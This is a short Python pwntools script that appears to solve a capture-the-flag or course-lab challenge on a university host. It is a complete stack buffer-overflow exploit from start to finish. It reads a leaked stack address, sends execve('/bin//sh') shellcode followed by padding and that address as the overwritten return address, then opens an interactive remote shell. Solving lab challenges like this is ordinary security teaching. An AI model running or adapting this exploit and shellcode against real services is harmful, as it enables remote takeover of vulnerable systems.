from pwn import *
import struct


ip = "sqlab.zongyuan.nctu.me"
port = 6002
r = remote(ip,port)

context.arch = 'amd64'

juck = "A" * (216 - 24)

r.recvline()
r.recvline()
addr = r.recvline()
addr = int(addr[16:], 16)

shell = '\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'

payload = shell + juck + struct.pack('<Q', addr)
#print(payload)
r.sendline(payload)
r.interactive()
